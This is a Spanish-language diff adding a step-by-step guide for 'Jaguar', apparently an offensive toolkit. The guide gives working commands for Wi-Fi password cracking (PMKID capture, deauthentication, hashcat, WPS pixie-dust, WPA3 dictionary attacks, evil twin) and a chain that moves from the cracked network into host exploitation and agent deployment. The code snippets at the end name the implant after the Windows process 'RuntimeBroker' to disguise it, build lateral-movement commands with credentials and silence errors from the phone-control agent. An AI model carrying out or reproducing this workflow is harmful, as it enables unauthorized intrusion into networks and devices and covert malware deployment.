@@ -1,0 +1,400 @@
+============================================================================
+ JAGUAR — MODO MONITOR Y CADENA Wi-Fi: REQUISITOS + GUÍA PASO A PASO
+============================================================================
+ Léelo entero antes de la primera prueba. La mayoría de "no me funciona"
+ es esto, no el programa.
+============================================================================
+
+
+====================================================================
+ PARTE 0 — LA VERDAD SOBRE WINDOWS (por qué aún no puedes monitorizar)
+====================================================================
+Windows, de forma NATIVA, NO tiene modo monitor ni inyección de tramas.
+No es culpa de Jaguar: el driver NDIS de Windows no expone esas capacidades.
+
+Opciones, de mejor a peor:
+
+  [1] WSL2 + usbipd-win ............ recomendada y la que soporta Jaguar
+  [2] Kali/Ubuntu en máquina virtual con USB passthrough ... muy fiable
+  [3] Live USB o arranque dual Linux ...................... la mejor calidad
+  [4] Windows nativo con Npcap ...... solo captura, SIN inyección
+                                       (no sirve para deauth)
+
+Si tienes un portátil con Wi-Fi y quieres monitor en Windows: opción 1 o 2.
+Jaguar detecta el backend `wsl` y traduce las rutas /mnt/c/... por ti.
+
+--------------------------------------------------------------
+ [1] PASO A PASO WSL2 (Windows 10 21H2+ / Windows 11)
+--------------------------------------------------------------
+ 1. Abre PowerShell COMO ADMINISTRADOR.
+
+ 2. Instala WSL2 y una distro:
+      wsl --install -d Ubuntu
+    Reinicia cuando lo pida. Si ya tienes WSL:
+      wsl --set-default-version 2
+
+ 3. Instala usbipd-win (pasa el USB de Windows a WSL):
+      winget install --interactive --exact dorssel.usbipd-win
+    Alternativa manual: https://github.com/dorssel/usbipd-win/releases
+
+ 4. Instala el stack de Wi-Fi DENTRO de WSL:
+      wsl -d Ubuntu -u root
+      apt update
+      apt install -y aircrack-ng hcxtools hashcat reaver bully mdk4 iw \
+                     wpasupplicant hostapd dnsmasq isc-dhcp-client \
+                     pixiewps usbutils
+      exit
+
+ 5. Pasa el adaptador (hay que repetirlo tras cada reinicio o desconexión):
+      usbipd list
+      usbipd bind --busid 2-3          (usa el BUSID real de tu adaptador)
+      usbipd attach --wsl --busid 2-3
+    Comprueba dentro de WSL:   iw dev      -> debe aparecer tu tarjeta.
+    Si NO aparece, el attach no se hizo o el driver no está en el kernel WSL.
+
+ 6. Limitaciones reales que vas a encontrar en WSL2:
+      - Adaptadores con driver in-tree (ath9k_htc / AR9271, mt76 / MT7612U)
+        suelen funcionar en monitor e inyección.
+      - Chips RTL8812AU/8814AU necesitan driver externo (dkms) DENTRO de WSL:
+          apt install -y git dkms build-essential linux-headers-$(uname -r)
+          git clone https://github.com/aircrack-ng/rtl8812au
+          cd rtl8812au && make dkms_install
+        Si el kernel de WSL no tiene headers para tu versión, puede fallar.
+      - `airmon-ng` a veces no puede renombrar la interfaz en WSL. Si pasa,
+        monitoriza a mano con `iw` (ver Parte 2, bloque B).
+      - WSL2 no trae systemd en versiones antiguas: si `systemctl` falla,
+        usa `service` o reinicia WSL con `wsl --shutdown`.
+
+--------------------------------------------------------------
+ [2] ALTERNATIVA: MÁQUINA VIRTUAL CON USB PASSTHROUGH
+--------------------------------------------------------------
+ VMware/VirtualBox + Kali. En VirtualBox: Dispositivos USB -> tu adaptador.
+ En VMware: VM -> Removable Devices -> Connect. Luego sigue la Parte 2.
+ Es la opción más estable si WSL2 te da guerra con los drivers.
+
+--------------------------------------------------------------
+ ADAPTADORES: qué buscar
+--------------------------------------------------------------
+ BUENOS (monitor + inyección):
+   - Atheros AR9271  (2.4 GHz, 150 Mbps, driver in-tree, el más compatible)
+   - Ralink RT3070 / RT5370  (2.4 GHz, driver in-tree)
+   - Realtek RTL8812AU / RTL8814AU  (2.4+5 GHz, driver externo)
+   - MediaTek MT7612U  (2.4+5 GHz, driver mt76 in-tree)
+   - MediaTek MT7921AU (2.4+5+6 GHz, driver mt76, requiere kernel >= 5.15)
+
+ A EVITAR: tarjetas internas de portátil (suelen no inyectar), adaptadores
+ "nano" sin antena, y cualquier chip Broadcom moderno.
+
+ 6 GHz: solo con adaptador 802.11ax (MT7921AU) y regulación desbloqueada.
+ En 6 GHz WPA3 es obligatorio -> se ataca con wacker, no con PMKID.
+
+
+====================================================================
+ PARTE 1 — REQUISITOS POR PLATAFORMA
+====================================================================
+El panel de diagnóstico de la pestaña Wi-Fi te dice qué falta exactamente y
+te da el comando listo (botón "📋 Copiar comando de instalación").
+
+--------------------------------------------------------------
+ LINUX NATIVO  -> backend "linux"   (LO QUE JAGUAR ESPERA)
+--------------------------------------------------------------
+ - Root, o sudo sin contraseña (la GUI no tiene tty para pedirla):
+     echo "$USER ALL=(ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/jaguar
+ - Paquetes (Debian/Ubuntu/Kali):
+     sudo apt update && sudo apt install -y aircrack-ng hcxtools hashcat \
+          reaver bully mdk4 iw wpasupplicant hostapd dnsmasq \
+          isc-dhcp-client network-manager pixiewps
+ - Arch:   sudo pacman -S aircrack-ng hcxtools hashcat reaver bully mdk4 iw \
+                          wpa_supplicant hostapd dnsmasq dhcpcd
+ - Fedora: sudo dnf install aircrack-ng hcxtools hashcat reaver bully mdk4 iw \
+                          wpa_supplicant hostapd dnsmasq dhclient
+ - Opcionales: git clone https://github.com/blunderbuss-wctf/wacker
+               git clone https://github.com/jabbaw0nky/DragonShift
+   (Jaguar los busca en ~/wacker/wacker.py, /opt/wacker/... etc.)
+
+--------------------------------------------------------------
+ WSL2  -> backend "wsl"    (ver Parte 0)
+--------------------------------------------------------------
+ Mismo stack que Linux dentro de WSL + usbipd-win fuera.
+
+--------------------------------------------------------------
+ macOS  -> backend "linux"
+--------------------------------------------------------------
+ - Homebrew: brew install aircrack-ng hcxtools hashcat
+ - El chip Wi-Fi de Apple (Intel Mac) SÍ captura en monitor pero casi nunca
+   INYECTA. Para deauth fiable: adaptador USB externo + driver.
+ - Apple Silicon: peor todavía; lo práctico es Linux en VM.
+ - `airmon-ng` no existe en macOS: Jaguar cae al camino manual con `iw`/airport.
+
+--------------------------------------------------------------
+ ANDROID / TERMUX  -> backend "linux"
+--------------------------------------------------------------
+ - Requiere ROOT para `su -c input` (control táctil) y para monitor.
+ - pkg install python aircrack-ng hcxtools hashcat root-repo tsu
+ - Con adaptador USB por OTG + `iw dev` funciona si el kernel tiene driver.
+ - Sin root: puedes escanear (nmcli/iw) pero no inyectar.
+
+--------------------------------------------------------------
+ WINDOWS NATIVO  -> backend "windows"
+--------------------------------------------------------------
+ - Solo escaneo pasivo. Monitor: NO. Inyección: NO.
+ - `netsh wlan show interfaces` es lo único que se usa.
+
+
+====================================================================
+ PARTE 2 — CÓMO FUNCIONA CADA HERRAMIENTA Y CÓMO USARLA BIEN
+====================================================================
+Cada bloque: qué hace -> comando real -> cuándo funciona -> cómo saber que
+ha ido bien -> errores típicos.
+
+--------------------------------------------------------------
+ BLOQUE A — Preparar la tarjeta (airmon-ng)
+--------------------------------------------------------------
+ Qué hace: mata NetworkManager/wpa_supplicant/dhclient (que pelean por la
+ tarjeta) y pone la interfaz en modo monitor, renombrándola a algo tipo wlan0mon.
+
+   sudo airmon-ng check kill
+   sudo airmon-ng start wlan0
+   iw dev                       # debe mostrar "type monitor"
+
+ Cuándo funciona: chipset con soporte monitor.
+ Cómo saber que va bien: `iw dev` muestra el nuevo nombre con type monitor.
+ Errores típicos:
+   - "monitor mode enabled ... on wlan0mon" pero luego no ves nada ->
+     `iw dev wlan0mon info` para confirmar; si no pone monitor, el chip no vale.
+   - Después del ataque no hay internet: SIEMPRE
+       sudo airmon-ng stop wlan0mon
+       sudo systemctl start NetworkManager
+     Jaguar lo hace con el botón "🌐 Restaurar red".
+
+--------------------------------------------------------------
+ BLOQUE B — Camino manual con iw (cuando airmon-ng falla, p.ej. en WSL)
+--------------------------------------------------------------
+   sudo ip link set wlan0 down
+   sudo iw wlan0 set type monitor
+   sudo ip link set wlan0 up
+   sudo iw wlan0 set channel 6      # fijar canal del objetivo
+
+ Para volver:  sudo iw wlan0 set type managed ; sudo ip link set wlan0 up
+
+--------------------------------------------------------------
+ BLOQUE C — Escanear redes (airodump-ng / nmcli / wash)
+--------------------------------------------------------------
+   sudo airodump-ng wlan0mon                 # tabla en vivo, 15-30 s
+   sudo airodump-ng --band abg wlan0mon      # 2.4 + 5 + 6 GHz
+   sudo wash -i wlan0mon                     # solo APs con WPS
+   nmcli dev wifi list --rescan yes          # sin monitor (rápido)
+
+ Qué mirar: BSSID, canal (CH), cifrado (ENC), señal (PWR).
+ Criterio de éxito: PWR mejor que -70 dBm. Por debajo de -75 el handshake
+ se pierde y el PMKID no llega.
+
+--------------------------------------------------------------
+ BLOQUE D — PMKID CLIENTLESS (hcxdumptool)  ← el ataque estrella
+--------------------------------------------------------------
+ Qué hace: pide el PMKID del AP en la asociación. NO necesita que haya
+ ningún cliente conectado. Si el AP lo soporta, en segundos tienes material
+ para crackear sin molestar a nadie.
+
+   # filtro: solo nuestro AP
+   printf 'AABBCCDDEEFF\n' > filtro.txt
+   sudo hcxdumptool -i wlan0mon -o captura.pcapng \
+        --filterlist_ap=filtro.txt --filtermode=2 --enable_status=1
+   # 20-40 s, Ctrl+C
+
+   sudo hcxpcapngtool -o hash.22000 captura.pcapng
+   wc -l hash.22000          # >0 = hay PMKID
+
+ Cuándo funciona: el AP implementa RSN PMKID caching (la mayoría de routers
+ domésticos modernos). Cuándo NO: APs antiguos o con "802.11r/Fast Roaming"
+ raro -> hay que caer al Bloque E.
+ AVISO DE VERSIÓN: la CLI de arriba es de hcxdumptool v6. En v7 las banderas
+ cambian (--filterlist_ap -> -f, --enable_status -> -s). Jaguar usa la v6;
+ si tienes v7 fallará y pasará solo al Bloque E.
+
+--------------------------------------------------------------
+ BLOQUE E — DEAUTH + HANDSHAKE (aireplay-ng + airodump-ng)  ← fallback
+--------------------------------------------------------------
+ Qué hace: echa a un cliente del AP para forzar la reasociación y captura
+ el 4-way handshake. Necesita que HAYA algún cliente conectado (o un móvil
+ cerca que puedas echar).
+
+   sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon
+   # en otra terminal:
+   sudo aireplay-ng --deauth 8 -a AA:BB:CC:DD:EE:FF wlan0mon
+   # si no cae nadie, fuerza el cliente concreto:
+   sudo aireplay-ng --deauth 8 -a AA:BB:CC:DD:EE:FF -c <MAC_cliente> wlan0mon
+
+ Cómo saber que va bien: en airodump, arriba a la derecha aparece
+ "WPA handshake: AA:BB:CC:DD:EE:FF".
+ Errores típicos:
+   - Canal equivocado en airodump -> nunca verás el handshake.
+   - En 5 GHz hay que fijar `-c <canal>` sí o sí.
+   - Si el AP es WPA3 puro no hay handshake clásico (ver Bloque H).
+
+--------------------------------------------------------------
+ BLOQUE F — CONVERSIÓN A HASH (hcxpcapngtool)
+--------------------------------------------------------------
+   hcxpcapngtool -o hash.22000 captura.pcapng
+   # o desde un .cap viejo:  hcxpcapngtool -o hash.22000 captura.cap
+ Cómo saber que va bien: el comando imprime "PMKID found" o
+ "EAPOL pairs ... written to hash.22000". El fichero .22000 tiene formato
+ WPA*01* (PMKID) o WPA*02* (EAPOL).
+
+--------------------------------------------------------------
+ BLOQUE G — CRACKEAR (hashcat modo 22000, fallback aircrack-ng)
+--------------------------------------------------------------
+   hashcat -m 22000 -a 0 --force hash.22000 rockyou.txt
+   # con reglas (mejora muchísimo el ratio):
+   hashcat -m 22000 -a 0 -r rules/best64.rule hash.22000 rockyou.txt
+   # sin GPU o si hashcat da problemas:
+   aircrack-ng -w rockyou.txt hash.22000
+
+ Dónde está rockyou:  sudo apt install wordlists && sudo gunzip \
+                        /usr/share/wordlists/rockyou.txt.gz
+ Cómo saber que va bien: hashcat imprime "Recovered" y `--show` te da la PSK.
+ Errores típicos:
+   - Sin GPU, hashcat puede tardar horas. Usa `-w 3` o pasa a aircrack-ng.
+   - "No hashes loaded": la captura no tenía PMKID/handshake -> vuelve atrás.
+   - Orden de ataque recomendado: rockyou -> rockyou+best64 -> secLists.
+
+--------------------------------------------------------------
+ BLOQUE H — WPA3
+--------------------------------------------------------------
+ WPA3 puro (SAE): NO hay PMKID ni handshake clásico. Ataque = diccionario
+ ONLINE contra el AP (lento pero funciona):
+   git clone https://github.com/blunderbuss-wctf/wacker
+   python3 wacker/wacker.py --wordlist rockyou.txt \
+        --ssid "MiRed" --bssid AA:BB:CC:DD:EE:FF --interface wlan0mon
+
+ Transición WPA2/WPA3 (lo más común): el AP ANUNCIA WPA3 pero acepta WPA2.
+ -> se ataca como WPA2 (Bloques D/E). Muchos APs "WPA3" son en realidad
+    transición y caen por PMKID.
+ DragonShift fuerza el downgrade de transición:
+   git clone https://github.com/jabbaw0nky/DragonShift
+
+--------------------------------------------------------------
+ BLOQUE I — WPS (reaver / bully / pixiewps)  ← el más rápido si está activo
+--------------------------------------------------------------
+ Qué hace: pixie-dust rompe el PIN WPS offline. Si el AP lo permite, PSK en
+ menos de 10 minutos.
+   sudo wash -i wlan0mon                       # ¿tiene WPS? ¿está lock?
+   sudo reaver -K 1 -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv -N
+   # alternativa:
+   sudo bully -b AA:BB:CC:DD:EE:FF -c 6 -d wlan0mon
+ Errores típicos:
+   - "WPS locked": alguien intentó antes; espera o reinicia el router.
+   - El AP corta la conexión cada X intentos -> `-N` (no reconectar) ayuda.
+   - Si pixie falla, el PIN completo tarda horas.
+
+--------------------------------------------------------------
+ BLOQUE J — mdk4 (deauth masivo, FragAttacks)
+--------------------------------------------------------------
+   sudo mdk4 wlan0mon a -a AA:BB:CC:DD:EE:FF     # deauth solo de ese AP
+   sudo mdk4 wlan0mon b                          # beacon flood
+   sudo mdk4 wlan0mon f                          # FragAttacks
+ Nota: sin `-a <bssid>`, el modo `a` golpea TODO el canal.
+
+--------------------------------------------------------------
+ BLOQUE K — CONECTARSE A LA RED (nmcli / wpa_supplicant)
+--------------------------------------------------------------
+   # 1) sacar la tarjeta de monitor
+   sudo airmon-ng stop wlan0mon
+   # 2) conectar
+   sudo nmcli dev wifi connect "MiRed" password "laPSK" ifname wlan0
+   # o a mano:
+   sudo wpa_supplicant -B -i wlan0 -c wpa.conf
+   sudo dhclient -1 wlan0
+   ip -4 addr show wlan0        # ¿hay IP?
+ Jaguar lo hace con el botón "🔌 Conectar a esta red" y verifica la IP.
+ Si no hay IP: PSK mala, DHCP lento, o canal 5 GHz fuera de rango del chip.
+
+--------------------------------------------------------------
+ BLOQUE L — Evil twin (hostapd + dnsmasq)
+--------------------------------------------------------------
+ Clonas el SSID para que los clientes se conecten a ti y capturas la PSK o
+ sirves un portal. Jaguar lo lanza con el botón "👥 Evil twin".
+
+
+====================================================================
+ PARTE 3 — FLUJO RECOMENDADO DENTRO DE JAGUAR (orden exacto)
+====================================================================
+ 1. Pestaña 📡 Wi-Fi -> mira el diagnóstico. Si sale algo en rojo, arréglalo.
+    Botón "📋 Copiar comando de instalación" y pégalo en la terminal.
+ 2. Elige la interfaz -> "🛰 Activar monitor". Debe decir "Monitor activo".
+    Si dice "no soporta monitor", sigue en solo-escucha (podrás escanear,
+    pero no deauth).
+ 3. "🔎 Escanear APs" con 20-30 s. Se abre la VENTANA FLOTANTE con las redes.
+    Ordena por "Señal (dBm)" y quédate con las mejores de arriba.
+ 4. Doble clic en la red -> objetivo marcado (SSID se rellena solo).
+ 5. Elige diccionario (rockyou) y deja las reglas en "Sin reglas" al principio.
+ 6. "⚔ Atacar AP (auto)". La cadena hace, en orden:
+       PMKID clientless -> si falla, deauth+handshake -> si hay WPS, pixie
+       -> si es WPA3 puro, wacker.
+    Lee el log: cada paso queda escrito.
+ 7. Cuando salga la PSK, apúntala.
+ 8. "🔌 Conectar a esta red" -> verifica que hay IP.
+ 9. "➡ Enviar subred al Escáner" -> se rellena el objetivo del Escáner.
+10. Pestaña Escáner -> "▶ Escanear" -> hosts y puertos.
+11. "🎯 Recomendar exploits" -> revisa CVE y riesgo.
+12. "🔍 Verificar (nmap NSE)" para confirmar, "⚡ Explotar (nativo)" o
+    "🚀 Desplegar agente" para conseguir sesión.
+13. El cliente aparece solo en el árbol. Clic derecho -> menú filtrado por SO.
+
+
+====================================================================
+ PARTE 4 — CHECKLIST DE ÉXITO (si algo falla, revisa esto EN ORDEN)
+====================================================================
+ [ ] ¿`iw dev` lista tu adaptador? Si no, no hay nada que hacer.
+ [ ] ¿`iw dev <if> info` dice "type monitor"? Si no, no hay inyección.
+ [ ] ¿Estás en el CANAL correcto? El 90% de los fallos de handshake es esto.
+ [ ] ¿Señal mejor que -70 dBm? Si no, acércate al router.
+ [ ] ¿`hcxpcapngtool` dijo "PMKID found"? Si no, usa deauth.
+ [ ] ¿El .22000 tiene líneas?  `wc -l hash.22000`
+ [ ] ¿rockyou.txt descomprimido y con permisos de lectura?
+ [ ] ¿hashcat encuentra la PSK en otro diccionario? Prueba con reglas.
+ [ ] ¿Tras conectar hay IP? Si no, `nmcli` y revisa la PSK.
+ [ ] ¿NetworkManager está peleando? `sudo airmon-ng check kill`.
+ [ ] ¿Sudo pide contraseña? Configura el sudoers NOPASSWD.
+ [ ] Al terminar: "🌐 Restaurar red" para no quedarte sin Wi-Fi.
+
+
+====================================================================
+ PARTE 5 — QUÉ ES NORMAL Y QUÉ NO
+====================================================================
+ NORMAL:
+  - El PMKID no aparece en un AP viejo -> cae a deauth. Es lo esperado.
+  - Un AP WPA3 puro tarda mucho con wacker. Es un ataque online.
+  - En WSL2 `airmon-ng` falle: se monitoriza con `iw`.
+  - Algunos APs no dejan deauth (clientes con 802.11w/PMF). Usa PMKID.
+
+ NO ES NORMAL:
+  - "type monitor" nunca aparece con un chip compatible -> driver mal.
+  - airodump no ve NADA con la tarjeta en monitor -> canal/regulación/antena.
+  - Tras el ataque no vuelve el Wi-Fi y `systemctl start NetworkManager`
+    no lo arregla -> reinicia, y reporta la salida del log de Jaguar.
+============================================================================
+
+En main_window.py, dentro de _lateral_jump, _desplegar_agente y _lateral_autourl, pasa el exe para que la URL y el binario casen:
+python
+
+exe = (self.in_bnombre.text().strip() or "RuntimeBroker")
+        if os.name != "nt":
+            exe += ""            # en Linux/macOS el binario va sin extensión
+        else:
+            exe += ".exe"
+        cmd = lateral.comando_completo(tecnica, target, url, exe=exe,
+                                       usuario=self.in_lat_user.text().strip(),
+                                       password=self.in_lat_pass.text())
+
+y al final de _build_ui(), después de root.addWidget(split, 1):
+python
+
+self._beacon_refrescar()     # deja lista la lista de clientes (aún vacía)
+
+En movil_dialog.py, dentro de _datos, justo antes del if datos.get("error"):
+python
+
+# El agente no tiene handler movil_pantalla_off: silenciamos su error.
+        if cmd == "movil_pantalla_off":
+            return
